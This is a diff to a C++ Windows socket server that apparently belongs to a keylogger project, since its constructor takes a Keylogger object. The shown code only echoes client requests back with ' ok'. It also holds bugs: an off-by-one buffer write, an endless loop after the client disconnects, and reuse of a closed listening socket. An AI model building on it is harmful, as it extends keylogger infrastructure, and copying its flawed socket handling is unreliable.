@@ -1,9 +1,9 @@
 #include "stdafx.h"
 #include "SocketServer.h"
 
-#include <iostream>
-
 SocketServer::SocketServer(Keylogger* logger) {
+	listenSocket = INVALID_SOCKET;
+
 	std::cout << "socket";
 	WSADATA wsaData;
 	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -37,53 +37,76 @@ SocketServer::SocketServer(Keylogger* logger) {
 		WSACleanup();
 	}
 
-	auto bindResult = bind(this->listenSocket, addr->ai_addr, (int)addr->ai_addrlen);
+	int bindResult = ::bind(this->listenSocket, addr->ai_addr, (int)addr->ai_addrlen);
 
 	if (listen(this->listenSocket, SOMAXCONN) == SOCKET_ERROR) {
 		cerr << "listen failed with error: " << WSAGetLastError() << "\n";
 		closesocket(this->listenSocket);
+		this->listenSocket = INVALID_SOCKET;
 		WSACleanup();
 	}
 }
 
 void SocketServer::start() {
+	if (this->listenSocket == INVALID_SOCKET) {
+		cerr << "socket is not active" << std::endl;
+		return;
+	}
+
 	char requestBuffer[BUFFER_SIZE];
 	int clientSocket = INVALID_SOCKET;
 
-	for (;;) {
-		// Принимаем входящие соединения
+	while (true) {
 		clientSocket = accept(this->listenSocket, NULL, NULL);
+		std::cout << "accepted client: " << clientSocket << std::endl;
+
 		if (clientSocket == INVALID_SOCKET) {
-			cerr << "accept failed: " << WSAGetLastError() << "\n";
+			cerr << "accept failed: " << WSAGetLastError() << std::endl;
 			closesocket(this->listenSocket);
 			WSACleanup();
+			continue;
 		}
 
-		int result = recv(clientSocket, requestBuffer, BUFFER_SIZE, 0);
+		while (true) {
+			int receivedSize = recv(clientSocket, requestBuffer, BUFFER_SIZE, 0);
+			
+			
+			std::string response;
 
-		std::stringstream response;
-		std::stringstream response_body;
+			if (receivedSize == SOCKET_ERROR) {
+				cerr << "recv failed: " << receivedSize << std::endl;
+				break;
+			} else if (receivedSize == 0) {
+				cerr << "connection closed..." << std::endl;
+			} else if (receivedSize > 0) {
+				requestBuffer[receivedSize] = '\0';
+				std::string request = std::string(requestBuffer);
+				std::cout << "received: " << request << std::endl;
 
-		if (result == SOCKET_ERROR) {
-			cerr << "recv failed: " << result << "\n";
-			closesocket(clientSocket);
-		} else if (result == 0) {
-			cerr << "connection closed...\n";
-		} else if (result > 0) {
-			requestBuffer[result] = '\0';
+				response = this->getResponse(request);
 
-			response_body << requestBuffer << " ok";
+				int sendResult = send(clientSocket, response.c_str(),
+					response.size(), 0);
 
-			result = send(clientSocket, response.str().c_str(),
-				response.str().length(), 0);
+				if (request.compare("exit") == 0) {
+					break;
+				}
 
-			if (result == SOCKET_ERROR) {
-				cerr << "send failed: " << WSAGetLastError() << "\n";
+				if (sendResult == SOCKET_ERROR) {
+					cerr << "send failed: " << WSAGetLastError() << std::endl;
+				}
 			}
-
-			closesocket(clientSocket);
 		}
+
+		closesocket(clientSocket);
 	}
+
+}
+
+std::string SocketServer::getResponse(std::string request) {
+	std::stringstream responseStream;
+	responseStream << request << " ok";
+	return responseStream.str();
 }
 
 
